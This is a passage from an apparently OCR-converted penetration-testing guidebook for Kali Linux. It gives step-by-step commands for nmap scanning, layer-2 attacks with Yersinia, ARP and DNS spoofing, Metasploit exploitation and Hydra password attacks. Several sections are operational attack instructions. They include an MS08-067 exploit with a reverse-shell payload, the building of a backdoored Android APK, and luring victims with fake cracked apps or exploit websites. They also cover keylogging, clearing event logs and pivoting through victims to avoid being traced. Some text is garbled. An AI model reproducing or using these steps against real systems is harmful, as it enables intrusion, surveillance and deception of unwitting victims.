+    \ reconnaissance step. It has a lot built-in features and plugins which can be\
+    \ used to identify the vulnerable hosts and services on the network or over Internet.\n\
+    \nUsing“man nmap” and “nmap -h” you can familiarize yourself with its options\
+    \ and usage.\n\n+   * Below we explain some examples of using nmap\n  * nmap 192.168.1.24\
+    \ -- Scanning one IP address\n  * nmap 192.168.1.0 - 255 -- Scanning a range of\
+    \ IP addresses\n  * nmap 192.168.1.0/24 -- Scanning a subnet\n  * nmap -sP -iP0\
+    \ -- Ping scan\n  * nmap -sS -PP0 -sV -O 192.168.1.0-50 -- TCP Syn scan, Protocol\
+    \ scan, determine the version, discover the operating system"
+  merge: -1
+  pgno: 64
+- img_proc: true
+  md: '+   ○ nmap -T5 192.168.1.0/24 -- Timing aggressiveness - T5 is quicker than
+    T1
+
+
+    +   ○ nmap -top-ports 20 192.168.1.0/24 -- only top 20 ports - popular ports
+
+
+    +   ○ nmap -sT -p80 192.168.1.50-100 -- TCP scan, only port 80
+
+    ○ nmap -sS 192.168.1.1-5 -D 192.168.98,192.168.1.99 -- Will send the scans from
+    multiple source IP addresses that you specify after D. This can distract the network
+    admin as there are a lot of scans from multiple sources
+
+
+    +   ○ nmap -V 192.168.1.6 -- Verbose mode will provide more details on screen
+
+
+    +   ○ nmap -F 192.168.1.0/24 -exclude 192.168.1.1, 192.168.1.2 -- -F means only
+    top 100 ports to be scanned and exclude those two IP address from the range
+
+
+    +   ○ nmap -Pn 192.168.1.6 -- It won''t do ping but just do the scan. Without
+    this option, it will try pinging the host first
+
+
+    +   ○ nmap --iflist -- Get a list of interfaces and IPs
+
+
+    +   ○ nmap -A -T4 192.168.1.1 --A means do the Script, Operating NMAP with version,
+    traceroute, T4 for timing
+
+
+    +   * Using Nmap with IPv6
+
+
+    +   ○ ifconfig eth0 ipv6 add 2001:db8:6783:1::64
+
+
+    +   ○ nmap -6 2001:db8:6783:1::1
+
+
+    +   * Nmap Scripts
+
+
+    +   ○ nmap --script=default 192.168.1.24 -- The same as nmap -sC 192.168.1.24
+
+
+    +   ○ There are a lot of script options like DoS, Safe, exploit, malware, vulnerability,
+    discovery, etc.
+
+
+    +   ○ nmap --script-help discovery -- This is a help for the scripts
+
+
+    +   ○ nmap -script “safe or default” 192.168.1.24 -- Run default and safe scripts
+    together
+
+
+    +   ○ nmap -script “discovery and version” 192.168.1.24
+
+
+    +   * Nmap GUI Interface
+
+
+    +   ○ There is a graphical interface for nmap if you prefer to use that. The GUI
+    interface is called Zenmap and you can run it with “zenmap” command.'
+  merge: -1
+  pgno: 65
+- img_proc: true
+  md: '# DHCP Starvation attack
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_66_0.png)
+
+
+    On most of the corporate networks there are DHCP servers which serves the IP addresses
+    configuration to the clients. DHCP servers include zones with a range of free
+    IP addresses and when a client requests and IP address, one IP from that range
+    will be allocated to it.
+
+
+    DHCP Starvation is basically a type of DoS attack in which an attacker sends unlimited
+    requests to the DHCP server and asks for IP addresses. This will use all of the
+    available IP addresses in DHCP zone and no IP address will be left for other clients
+    on the network to use.
+
+
+    +   * The application to use for DHCP Starvation attack is called Yersinia and
+    the command to run it is “yersinia"
+
+    * yersinia -G -- Graphical interface for the application
+
+    * Select DHCP, Launch attack and select “Sending DISCOVER Packet"
+
+    * The above will start asking for multiple IP addresses from the DHCP server until
+    it fills up the DHCP pool and DHCP won’t be able to allocate any new IP to any
+    other client on the network
+
+    * This is a form of DoS attack and blocks user from accessing anything on the
+    network'
+  merge: -1
+  pgno: 66
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_67_0.png)'
+  merge: -1
+  pgno: 67
+- img_proc: true
+  md: '# Become the Root of Spanning Tree
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_68_0.png)
+
+
+    The Spanning Tree Protocol (STP) is a network protocol that ensures a loop-free
+    topology for any bridged Ethernet local area network. The basic function of STP
+    is to prevent bridge loops and the broadcast radiation results from them.
+
+
+    The root bridge of the spanning tree is the bridge with the smallest (lowest)
+    bridge ID which is the focal point in the network. The root bridge of the spanning
+    tree is the bridge with the smallest (lowest) bridge ID. Each bridge has a configurable
+    priority number and a MAC Address; the bridge ID contains both numbers combined
+    together - bridge priority + MAC (32768.0200.0000.1111).
+
+
+    With this attack, we can take over the bridge responsibility and break the network
+    operation.
+
+
+    +   * The tool that will be used for this attack is Yersinia
+
+    * One option is to have a device between two switches (potentially a hub) and
+    connect Kali to that device
+
+    * Second option is if you have two interfaces on Kali and connect each to one
+    switch and launch a STP+Man in the middle attack and Kali'
+  merge: -1
+  pgno: 68
+- img_proc: true
+  md: 'will become root
+
+
+    +   - Then we can advertise device as STP root
+
+    - Yersinia -G -- Graphical interface of yersinia
+
+    - Select STP and launch attack
+
+    - Select "Claiming Root Role" and Launch the attack
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_69_0.png)'
+  merge: -1
+  pgno: 69
+- img_proc: true
+  md: '# CDP Flooding attack (DoS)
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_70_0.png)
+
+
+    The Cisco Discovery Protocol (CDP) is a proprietary Data Link Layer protocol developed
+    by Cisco Systems. It is used to share information about other directly connected
+    Cisco equipment, such as the operating system version and IP address.
+
+
+    On this type of attack we can send lots of CDP packets to neighbour network devices
+    and interrupt their operations.
+
+
+    Yersinia will be used for this type of attack. To test this:
+
+
+    +   - First clear CDP counters and tables on your switch and show CDP traffic
+    and neighbours - This is just to see the changes on the network devices, it is
+    optional
+
+    - Run yesinia -G
+
+    - Launch attack and select CDP
+
+    - Selecting "Flooding CDP table" will send tones of CDP packets to the switch
+
+    - Now check the CDP traffic and neighbour table on the switch'
+  merge: -1
+  pgno: 70
+- img_proc: true
+  md: '+   * You can see there are a lot of CDP neighbour relationship on the switch
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_71_0.png)'
+  merge: -1
+  pgno: 71
+- img_proc: true
+  md: '# HSRP DoS attack
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_72_0.png)
+
+
+    Hot Standby Router Protocol (HSRP) is a Cisco proprietary redundancy protocol
+    for establishing a fault-tolerant default gateway.
+
+
+    With HSRP you can have multiple network devices and represent only one IP address
+    to the clients, so if one device fails the other will take the role.
+
+
+    With this attack we can make Kali to join the HSRP cluster and become the active
+    router. Once this is done all of the client’s traffic will be sent to Kali instead
+    of the router. Attacker can achieve a “Man In The Middle” or a DoS attack and
+    cause interruption for the clients.'
+  merge: -1
+  pgno: 72
+- img_proc: true
+  md: 'Follow the below steps for an HSRP attack.
+
+
+    +   - yersinia -G
+
+    - Launch attack, select HSRP and select becoming active router
+
+
+    Note: Protection against this type of attack is possible with HSRP authentication.
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_73_0.png)'
+  merge: -1
+  pgno: 73
+- img_proc: true
+  md: "# Converting Access port to a 802.1q trunk port using DTP\n\n![](img/c6b688dca6570d17db3036b560ef0905_74_0.png)\n\
+    \nAccess ports are the ports which are being used to connect the end clients computers,\
+    \ printers, servers, etc. They can participate in one Vlan only.\n\nTrunk ports\
+    \ are the ports which are being used for network communications between multiple\
+    \ network devices and can carry multiple Vlans.\n\nThe network switches by default\
+    \ will negotiate the possibility of the port to become a trunk port (DTP). This\
+    \ attack can use this default behaviour of the switch to access the other Vlans\
+    \ and networks on the infrastructure. (Unless, the default configuration on the\
+    \ switch has been changed)\n\n+   * Run yersinia -G\n* View the switch DTP status\
+    \ by choosing DTP tab\n* Launch attack and select enable trunking\n* 802.1Q tab\
+    \ will show the trunk traffic\n* Use Wireshark to see the traffic\n* Now you can\
+    \ set up backtrack interface for 802.1q tagging\n    * modeprobe 8021q\n    *\
+    \ vconfig add eth0 20 -- Create vlan 20 sub interface for eth0\n    * ifconfig\
+    \ eth0.20 up\n    * ifconfig eth0.20 20.0.0.99/24\n* Now you have access to the\
+    \ vlan 20 and can start attacking other hosts"
+  merge: -1
+  pgno: 74
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_75_0.png)'
+  merge: -1
+  pgno: 75
+- img_proc: true
+  md: '# ARP Spoofing and MITM (Man In The Middle Attack)
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_76_0.png)
+
+
+    ARP spoofing is a technique whereby an attacker sends fake ("spoofed") Address
+    Resolution Protocol (ARP) messages onto a Local Area Network. Generally, the aim
+    is to associate the attacker''s MAC address with the IP address of another host
+    (such as the default gateway), causing traffic meant for that IP address to be
+    sent to the attacker instead.
+
+
+    ARP spoofing may allow an attacker to intercept data frames on a LAN, modify the
+    traffic, or stop the traffic altogether. The often attack used is an opening for
+    other attacks, such as denial of service, man in the middle, or session hijacking
+    attacks.
+
+
+    +   * With the steps below Kali will be between 10.0.0.2 (client) and 10.0.0.1
+    (firewall/router/switch)
+
+    * nmap -F 10.0.0.0/24 -- To find the devices on the network and their MAC addresses
+    and details
+
+    * echo 1 >/proc/sys/net/ipv4/ip_forward -- enable IP forwarding
+
+    * arpspoof -i eth0 -t 10.0.0.2 10.0.0.1 -- This tells to 10.0.0.2 that Kali is
+    10.0.0.1
+
+    * arpspoof -i eth0 -t 10.0.0.1 10.0.0.2 -- This tells to 10.0.0.1 that Kali is
+    10.0.0.2
+
+    * With the above commands running and you can verify this on the firewall/gateway
+
+    * Now we can start watching the traffic using sniffer or below
+
+    * driftnet -i eth0 -- This will open a window and show the content of the websites
+    that the victim is browsing'
+  merge: -1
+  pgno: 76
+- img_proc: true
+  md: '+   * urlsnarf -i eth0 -- This will show the urls that victim is browsing
+
+    * Once you cancel the arpspoof commands it will restore the ARP tables to the
+    original ones by sending them to the gateway and victim!'
+  merge: -1
+  pgno: 77
+- img_proc: true
+  md: '# Metasploit Framework
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_78_0.png)
+
+
+    The Metasploit Project is an open source project that provides a public resource
+    for researching security vulnerabilities and developing code that allows a network
+    administrator to break into his own network to identify security risks and document
+    which vulnerabilities need to be addressed first.
+
+
+    The Metasploit Project offers penetration (pen) testing software and provides
+    tools for automating the comparison of a program''s vulnerability and its repaired
+    (patched) version. Anti-forensic and advanced evasion tools are also offered,
+    some of them built into the Metasploit Framework.
+
+
+    The basic steps for exploiting a system using the Framework include:
+
+
+    +   1. Choosing and configuring an exploit (code that enters a target system by
+    taking advantage of one of its bugs; about 900 different exploits for Windows,
+    Unix/Linux and Mac OS systems are included)
+
+    * Optionally checking whether the intended target system is susceptible to the
+    chosen exploit
+
+    * Choosing and configuring a payload (code that will be executed on the target
+    system upon successful entry; for instance, a remote shell or a VNC server)
+
+    * Choosing the encoding technique so that the intrusion-prevention system (IPS)
+    ignores the encoded payload'
+  merge: -1
+  pgno: 78
+- img_proc: true
+  md: "+   ○ Executing the exploit\n\nMetasploit Framework can be used with command\
+    \ line or GUI interface using Armitage. Follow the below steps to install/update\
+    \ and use Metasploit if required.\n\n+   * First time you can try to run it with\
+    \ msfconsole command if it is already available\n* If there is any issue you can\
+    \ install/reinstall the package\n    * apt-get purge metasploit\n    * rm -rf\
+    \ /opt/metasploit\n    * apt-get update\n    * apt-get install metasploit\n* Once\
+    \ installed you can run and Use Metasploit\n* Before you run msfconsole you need\
+    \ to make sure Postgresql and metasploit services are running\n    * service postgresql\
+    \ start\n    * service metasploit start\n\n+   * Run msfconsole -- Command line\
+    \ interface\n* Check the database connection with “db_status” command\n    * You\
+    \ should see it is connected to msf database\n* If it is not connected, you can\
+    \ try to manually connect to the database\n    * db_connect -y /opt/metasploit/apps/pro/ui/config/database.yml\n\
+    \    * Check “db_status” again\n* Some example of using Metasploit:\n    * Scanning\
+    \ functionality - Type the commands at prompt\n        * use scanner/portscan/syn\n\
+    \        * show options\n    * set RHOSTS 192.168.1.50\n    * set PORTS 20-80\n\
+    \    * run\n* Syn flood attack\n    * use auxiliary/dos/tcp/synflood\n    * show\
+    \ options\n    * set RHOST 192.168.1.50 -- Destination"
+  merge: -1
+  pgno: 79
+- img_proc: true
+  md: "+   * set SHOST 10.0.0.50 -- Source\n* set -- This will show your settings\n\
+    * run\n\n+   - Run armitage --This is the GUI interface for Metasploit\n  * You\
+    \ can use this GUI interface to initiate the attack which is easier"
+  merge: -1
+  pgno: 80
+- img_proc: true
+  md: '# Metasploit Framework (MSF) using Modules, Payloads and exploits
+
+
+    Now it is time to learn how to use metasploit console. Metasploit has lots of
+    modules which can be loaded and used for exploits penetration. You can also do
+    all kind of scanning and vulnerability assessment with it which are prerequisites
+    before starting the penetration.
+
+
+    To run Metasploit command line interface, you can simply run the below command:
+
+
+    +   * msfconsole
+
+
+    Next step is to create a workspace. Workspaces are used to separate different
+    works, scans and attacks. For example, if you are working on multiple projects
+    belong to different customers, you can create a different workspace for each customer.
+    While you are working on one workspace it won''t affect the others.
+
+
+    To set up workspaces follow the below steps:
+
+
+    +   * workspace -- Shows the current workspace
+
+    * dbstatus -- Shows the status of the database
+
+    * workspace -h -- Workspace is used to separate different customer''s databases
+
+    * workspace -a TestLab -- This will create a new workspace TestLab
+
+    * workspace -- Shows the current workspace
+
+
+    Metasploit framework provides full nmap functionality within the application.
+    You can do all kind of nmap scanning on the command line interface and the output
+    will be put in a database for the next steps of penetration.
+
+
+    To use scanning functionality within Metasploit follow the below steps:
+
+
+    +   * db_nmap -T4 -A 10.0.0.2 -- This will run nmap and put the results in database'
+  merge: -1
+  pgno: 81
+- img_proc: true
+  md: '+   - hosts -- It will show the hosts which are discovered
+
+    - services -- It will show the services discovered inside the host
+
+
+    To attack a host with an exploit, you need to find the module for that exploit
+    and load it into Metasploit. Then you can set the options and launch the attack.
+    Follow the below steps to initiate a netapi vulnerability attack to a host. In
+    this example the remote host IP address is 10.0.0.2 and local host (Kali) On the
+    Metasploit console, search command will search within the database (vulnerabilities,
+    exploits, etc.).
+
+
+    +   - search -h -- To get a list of available options with search command
+
+    - search netapi -- Search for exploits related to netapi and return the path
+
+    - use exploit/windows/smb/ms08_067_netapi -- Use the path found on the above command
+
+    - show payloads -- This will list all of the payloads that can be used by this
+    module
+
+    - set payload windows/shell/reverse_tcp -- Use the payload you want. In this example,
+    reverse_tcp will initiate a TCP connection back to our Kali machine
+
+    - show options
+
+    - set RHOSTS 10.0.0.2
+
+    - set LHOSTS 10.0.0.4
+
+    - show options
+
+    - exploit -- This will launch the attack and provide you with the shell access
+    to the victim host (If the host is vulnerable)
+
+
+    All of the above steps can be done with Armitage (GUI interface) as well.
+
+
+    To set up the same attack with Armitage, you need to first run Armitage. From
+    the "Hosts" menu you have the option of db_nmap scanning which will scan the network
+    and provides a list of all hosts on the msf console.
+
+
+    You can initiate an attack analysis using "find attacks" on "Attacks" menu, with
+    armitage and find out the attacks that are applicable for some hosts. Once the
+    vulnerabilities identified and attacks are available, you can right click on the
+    host icon and initiate an attack.
+
+
+    +   - Note: "Hell mary" option will launch all the attacks at ones.'
+  merge: -1
+  pgno: 82
+- img_proc: true
+  md: '# Using an attacked host as a “Pivot point” for further attacks
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_83_0.png)
+
+
+    One of the important steps of a penetration work is to remove all the traces and
+    evidences so you can''t be tracked. One of the things which can be done is to
+    use a victim''s machine to initiate attacks to other hosts, so you won''t be any
+    track of your IP address.
+
+
+    The other use of “Pivot point” attack is when there is no access to a network
+    that you need to penetrate. For example, if there is host which has multiple connections
+    to different networks and only one of those networks is accessible by Kali machine.
+    To be able to attack other networks, that host can be used as a Pivot point.
+
+
+    Below we will show you how to use Armitage to do a Pivot point attack. In this
+    example, Kali and the victim machine are on the network A as normal clients. However,
+    the victim has got another connectivity to network B as well. The aim is to use
+    the victim machine to attack network B.
+
+
+    +   - client eth0 -- Get an IP address from DHCP server on Kali, assuming Kali
+    is on a DHCP enabled network
+
+    - Launch armitage
+
+    - You can clear the old Hosts and jobs by going to Hosts and View menu
+
+    - Quick scan with OS detection
+
+    - Make sure you remove the Hosts that you don''t want to attack, including your
+    own, from the list.
+
+    - Go to Attacks menu and select “find attacks"
+
+    - You can attack the victim just like previous step with shell access (netapi)
+    if you like'
+  merge: -1
+  pgno: 83
+- img_proc: true
+  md: '• You can check the ARP table by ARP Scan on the victims to find out what networks
+    they are connected to.
+
+
+    • Select “Meterpreter” and then “Pivoting” on the victim HOST and that will add
+    a route and list all the other hosts that can be found via that HOST and use that
+    victim HOST to do further attack.
+
+
+    • Now you can scan all other devices and by right click on them and select scan.
+
+
+    • And once found the services you can start attacking hosts they are on a different
+    network.
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_84_0.png)'
+  merge: -1
+  pgno: 84
+- img_proc: true
+  md: "# Vulnerability Scanning With OpenVAS and Metasploit\n\n![](img/c6b688dca6570d17db3036b560ef0905_85_0.png)\n\
+    \nMetasploit framework has a lot of built-in plug-ins for some famous vulnerability\
+    \ scanners, such as Nessus, Nexpose, OpenVAS, and WMAP. To use OpenVAS for vulnerability\
+    \ scanning of a host within the network below steps can be followed:\n\n+   *\
+    \ To run OpenVAS, type in load openvas in msfconsole and it will load and open\
+    \ the VAS plug-in from its database.\n* Now type in openvas_help and it will show\
+    \ all usage commands for OpenVAS.\n* We have to connect OpenVAS to its server\
+    \ by giving the command openvas_connect and it will show the full usage command,\
+    \ which is openvas_connect username host port <ssl-confirm> for connecting to\
+    \ the server. Example:\n  * openvas_connect rassoul tour localhost 9390 ok\n*\
+    \ As we can see in the above figure, our OpenVAS connection is successful. Now\
+    \ we will create a target for scanning. The command for creating a target is openvas\
+    \ target create <scan name> <target IP> <any comments>. In the below figure, we\
+    \ can see my scan name is windows7 , the target is 192.168.0.101 and the comment\
+    \ is new_scan , so the command is:\n  * openvas_target_create “windows7” 192.168.0.101\
+    \ “new_scan\"\n* After creating the target, we want to see the OpenVAS’s scan\
+    \ configuration list, so type in:\n  * openvas_config_list\n* OpenVAS has four\
+    \ types of scan configuration; we will select this as per requirement. To show\
+    \ your created targets type:\n  * openvas_target_list\n* Now we have a target\
+    \ and we have also seen the scan configuration, so we will create a task for scanning\
+    \ our target machine. To create a task,"
+  merge: -1
+  pgno: 85
+- img_proc: true
+  md: 'the command is openvas_task_create <scanname> <comment>
+
+    <scanconfigID> <targetID>. For example, in the above figure, we
+
+    type:
+
+
+    +   - openvas_task_create windows7 new_scan 3 1
+
+
+    +   - We can see that our task is created and the task ID is 0 for our target
+
+    machine. Now start the task by typing in openvas_task_start <taskID>.
+
+    Here we are using:
+
+
+    +   - openvas_task_start 0
+
+
+    +   - As we can see, after giving the start command, our request is
+
+    ubmitted, which means our scan should be starting now. Let us check
+
+    by typing in open_vas_list and it shows that our scan status is running
+
+    if progress is 1, meaning 1%. Command is:
+
+
+    +   - open_vas_list
+
+
+    +   - Just wait for some time and again check the progress. When the scan is
+
+    complete, the progress will show -1 and the status will show “Done.”
+
+
+    +   - Our scan is completed now, so we can download the report; type in
+
+    openvas_report_list and it will show all reports from its database.
+
+
+    +   - openvas_report_list
+
+
+    +   - There are several formats for downloading the report. Type in
+
+    enopenvas_format_list and it will list all available formats.
+
+
+    +   - openvas_format_list
+
+
+    +   - After choosing the format, we can download the report by using this
+
+    command: openvas_report_download <report id> <format id> <path
+
+    for saving report> <report name>. Here we can use:
+
+
+    +   - openvas_report_download 1 5 /root/Desktop report'
+  merge: -1
+  pgno: 86
+- img_proc: true
+  md: "# Take control of Android phone using Armitage\n\n![](img/c6b688dca6570d17db3036b560ef0905_87_0.png)\n\
+    \nBelow example will show how Armitage and Metasploit framework can be used to\
+    \ take control of an Android device. Reverse_tcp is a powerful handler on Metasploit\
+    \ framework which will be used for this purposes. Using Reverse_tcp you will be\
+    \ able to create a tunnel back to your Kali device from any Android (or other\
+    \ OS) device.\n\n+   * Command to generate the backdoor application:\n    * msfpayload/android/meterpreter/reverse_tcp\
+    \ LHOST=your_local_ip LPORT=8080 R > /root/Desktop/payload.apk\n    * This will\
+    \ create an Android package which if installed on the phone can be used to connect\
+    \ back to our host and penetrated.\n* You have to get the victim to install the\
+    \ Android package on his phone. One example is putting the file on file share\
+    \ websites like 4shared.com with a name which interests people. E.g. A free or\
+    \ cracked version of an Android application.\n* Run Armitage and search for handler\
+    \ and launch the /exploit/multi/handler (reverse_tcp) exploit. (Make sure the\
+    \ options are"
+  merge: -1
+  pgno: 87
+- img_proc: true
+  md: 'correct)
+
+
+    +   - Wait some time for the victim to install it.
+
+    - Run the sessions command on the console of Armitage to see if there is a current
+    session.
+
+    - If there is you can connect to it with "session -i 1" (1 is the session number)
+
+    - Now you should have the device on the Armitage screen and you can initiate different
+    attacks like file browsing, etc.'
+  merge: -1
+  pgno: 88
+- img_proc: true
+  md: "# Social Engineering Toolkit\n\n![](img/c6b688dca6570d17db3036b560ef0905_89_0.png)\n\
+    \nSocial Engineering Toolkit is a set of tools which can be used to initiate social\
+    \ engineering attacks. There are lots of different tools which can be used for\
+    \ different purposes.\n\n+   * It is a menu driven attack “system” which includes:\n\
+    \    * Spear-phishing (email)\n    * Mass mailer (email)\n    * Website (Browser)\n\
+    \    * Infected media (USB)\n    * Executable (Program)\n    * And more\n* Social\
+    \ Engineering Toolkit can be run with the “setoolkit” command.\n* The below toolkit\
+    \ is an example of SET attacks.\n* Run “setoolkit” and choose “Website Attack\
+    \ Vectors\"\n* Choose “Metasploit Browser Exploit Method\"\n* Choose “Web Template\"\
+    \n* If you are using NAT you need to provide the Translated address otherwise\
+    \ your interface IP address\n    * You will need to create a One-To-One NAT on\
+    \ the firewall to your Kali machine as well as make sure Kali is accessible over\
+    \ the"
+  merge: -1
+  pgno: 89
+- img_proc: true
+  md: "internet are not behind a NAT type your Kali machine IP address\n\n+   - --\
+    \ e.g. \"Java Required\"\n- Choose they type of exploit -- e.g. \"Metasploit Browser\
+    \ Autopwn (USE AT OWN RISK)\"\n- Choose what you want to do -- e.g. \"Windows\
+    \ Reverse_TCP Meterpreter\"\n- Choose additional requirements -- e.g. Port 443\n\
+    - Press enter key once finished\n- The web server with exploit is created and\
+    \ ready and is available on the address on output.\n- Once someone connects to\
+    \ the web server the exploit will kick in and a connection back to the Kali/Backtrack\
+    \ will be made\n  - There are several ways to get someone connect to that website.\
+    \ Examples are DNS poisoning or social engineering. With Social engineering you\
+    \ can investigate what victim’s interests are and make the website something interesting\
+    \ for them. For example, if they are interested in health products, it can be\
+    \ used as a free health product order and send to them. Or you can put a link\
+    \ on sharing web sites, etc. You need to be creative!\n- At the prompt you can\
+    \ type sessions to check if anyone is connected.\n- If you want to start interacting\
+    \ with one of the sessions type:\n  - session -i 1 -- This will start interacting\
+    \ with session 1\n- Use help command to get help\n- E.g clearev will delete all\
+    \ the Event logs on Windows!\n- E.g “execute -f calc.exe” -- You can run the calc.exe\
+    \ on the victim machine\n- E.g “keyscan_start” is a key logger and you can dump\
+    \ them by “keyscan_dump\""
+  merge: -1
+  pgno: 90
+- img_proc: true
+  md: '# Ettercap, Xplico and MITM attack
+
+
+    Start Targets Hosts View Mitm Filters Logging Plugins Help
+
+
+    | Target 1 | Target 2 |
+
+    | --- | --- |
+
+    | 192.168.1.1 | 192.168.1.2 |
+
+    | Delete | Add | Delete | Add |
+
+
+    2183 known services
+
+    Randomizing 255 hosts for scanning...
+
+    Scanning the whole netmask for 255 hosts...
+
+    0 hosts added to the hosts list...
+
+    Randomizing 255 hosts for scanning...
+
+    Scanning the whole netmask for 255 hosts...
+
+    1 hosts added to the hosts list...
+
+    Host 192.168.1.1 added to TARGET!
+
+
+    Man In The Middle attack is one of the most common types of attacks on the networks.
+    With this type of attack, attacker can sit between the client and the server and
+    capture all the traff without anyone notices this.
+
+
+    In this example, you will learn how to use ettercap and xplico software to initiate
+    a MITM attack and also sniff all the traffic going out from the victim’s machine.
+
+
+    Ettercap is a powerful tool which can be used to do several things like ARP poisoning,
+    DHCP and DNS spoofing or ICMP redirect.
+
+
+    Xplico is a great tool with a web interface which can be used to sniff and analyse
+    the traffic.'
+  merge: -1
+  pgno: 91
+- img_proc: true
+  md: "To start MITM attack using ettercap follow the below steps:\n\n+   - ettercap\
+    \ -G -- This will run the GUI of ettercap\n- From the Sniff menu select Unified\
+    \ sniffing and choose eth0\n- From the Hosts menu select “Scan for hosts\"\n-\
+    \ From the Hosts menu select “Hosts list\"\n- Select the gateway address as Target1\
+    \ and the Victim address as\n- Go to MITM menu and select Arp poisoning\n- That’s\
+    \ it, you have completed a MITM attack\n- Make sure IP forwarding is enabled on\
+    \ Kali to make sure victim has internet access\n\n```\necho 1 >/proc/sys/net/ipv4/ip_forward\n\
+    ```\n\n+   - Run xplico service on Kali using the below command\n  - Service xplico\
+    \ start\n  - You can install it with apt-get install xplico if it is not already\
+    \ installed\n  - Once installed run it with /etc/init.d/xplico start or the above\
+    \ command\n- Connect to the web interface specified on output on the default port\
+    \ 9876\n- Username and pass are “xplico\"\n- The steps that you need to follow\
+    \ is to create a new case and then a new session on xplico web interface\n- Then\
+    \ you need to select “Live acquisition” and start the capture\n  - You can open\
+    \ a saved captured file if you like as well. E.g using wireshark sniffer and save\
+    \ the captured file and open it with xplico\n- Click on the link provided and\
+    \ you can see all the analytics of data\n- You can stop the Live acquisition if\
+    \ you like and look at the captured data analysis\n- You can stop the MITM attack\
+    \ from the menu once of aftercap you are done"
+  merge: -1
+  pgno: 92
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_93_0.png)'
+  merge: -1
+  pgno: 93
+- img_proc: true
+  md: "# DNS Spoofing\n\n![](img/c6b688dca6570d17db3036b560ef0905_94_0.png)\n\nDNS\
+    \ spoofing is a term used when a DNS server accepts and uses incorrect information\
+    \ from a host that has no authority giving that information.\n\nDNS spoofing is\
+    \ in fact malicious cache poisoning where forged data is placed in the cache of\
+    \ the name servers.\n\nSpoofing attacks can cause serious security problems for\
+    \ DNS servers vulnerable to such attacks, for example causing users to be directed\
+    \ to wrong Internet sites or e-mail being routed to non-authorized mail servers.\n\
+    \nTo initiate a DNS spoofing attack follow the below steps:\n\n+   * Make sure\
+    \ the IP forwarding is enabled\n    * echo 1 >/proc/sys/net/ipv4/ip_forward\n\
+    * Usually MITM and DNS spoofing attacks can be combined and can redirect clients\
+    \ browser to Kali web server\n    * locate ettern.dns -- It is default in /etc/ettercap\
+    \ directory\n* Edit ettern.dns -- Add any A record for the domain that you want\
+    \ to point to the Kali IP address. E.g. add this line at the end of the file:"
+  merge: -1
+  pgno: 94
+- img_proc: true
+  md: '*.hurry.ws A 192.168.1.15
+
+
+    +   - aftercap -T -q -M:remote -P dns_spoof //
+
+
+    +   - The above command will initiate an arp spoofing for the whole network and
+    also use DNS spoofing plugin to attack
+
+
+    +   - We can also use the graphical interface with “ettercap -G” and spoof only
+    one client'
+  merge: -1
+  pgno: 95
+- img_proc: true
+  md: '# Dictionary attacks using Hydra and SSH
+
+
+    # Avoid using dictionary words as password
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_96_0.png)
+
+
+    A dictionary attack is a method of breaking into a password-protected computer
+    or server by systematically entering every word in a dictionary as a password.
+    A dictionary attack can also be used in an attempt to find the key necessary to
+    decrypt an encrypted message or document.
+
+
+    Below is a simple example of using dictionary attack to get SSH access to a client
+
+
+    +   * nmap 10.0.0.0/24
+
+    * Run xdra (GUI version of hydra)
+
+    * You can build a password list manually or use some applications to do this or
+
+    * Choose a list from the available password lists on Kali in /usr/share/wordlists
+    directory'
+  merge: -1
+  pgno: 96
+- img_proc: true
+  md: '+   - Choose target and options (Loop option will try the passwords with all
+    usernames first, otherwise it will try all passwords with one username first and
+    then go to the next one)
+
+    - Select Password list (/usr/share/wordlists/rockyou.txt) - Location can be different
+    based on your version
+
+    - Under Tunning tab specify details like Number of Tasks (VTYs) - Set to 5 as
+    6 could be maximum and more can causing issues), timeout,
+
+    - Start Tab to start the attack!
+
+    - Once the password matches you will get an alert with the matched username and
+    password'
+  merge: -1
+  pgno: 97
+- img_proc: true
+  md: "# Data Collection with Maltego\n\n![](img/c6b688dca6570d17db3036b560ef0905_98_0.png)\n\
+    \nMaltego is an open source intelligence and forensics application. It will offer\
+    \ you timely mining and gathering of information as well as the representation\
+    \ of this information in an easy to understand format.\n\nTo run and use maltego\
+    \ follow the below steps:\n\n+   - Maltego on the shell prompt or use the Kali\
+    \ menu\n  - You can also achieve this using Kali menu and Top 10 Security Tools\n\
+    - You need to create a free account and login to the tool\n- This gives you a\
+    \ GUI to gather information and analyse the data domains/networks\n- Login to\
+    \ the maltego application using your created account and open a blank project\n\
+    - Drag and Drop Domain In icon from the left to the right and type the name on\
+    \ it\n- Right click on the object created and from the “Run Transform” select\
+    \ the one that you need\n- E.g. you can get all top level domain information about\
+    \ a domain\n- Select all the domains you want and Right click and “Run Transform”\
+    \ -> All Transform -> Website Quick lookup\n  - This will give you the websites\
+    \ for those domains\n- You can Right click and find the IP addresses and other\
+    \ info if you like"
+  merge: -1
+  pgno: 98
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_99_0.png)'
+  merge: -1
+  pgno: 99
+- img_proc: true
+  md: '# Burp Suite
+
+
+    +   - Analysse the communication details between client and web server
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_100_0.png)
+
+
+    Burp Suite is an integrated platform for attacking web applications. It contains
+    a variety of tools with numerous interfaces between them designed to facilitate
+    and speed up the process of attacking an application. All of the tools share the
+    same framework for handling and displaying HTTP messages, persistence, authentication,
+    proxies, logging, alerting and extensibility.
+
+
+    A free limited version of Burp Suite is available on Kali to use. You can run
+    burpsuite from Kali Web Applications Menu and Web Vulnerability Scanners, or just
+    run burpsuite command on shell.
+
+
+    The Burp tools you will use for particular tasks are as follows:
+
+
+    +   - Spider - This can be used for automatically crawling an application, to
+    discover its content and functionality.
+
+    - Scanner - This is used to automatically scan HTTP requests to find security
+    vulnerabilities.
+
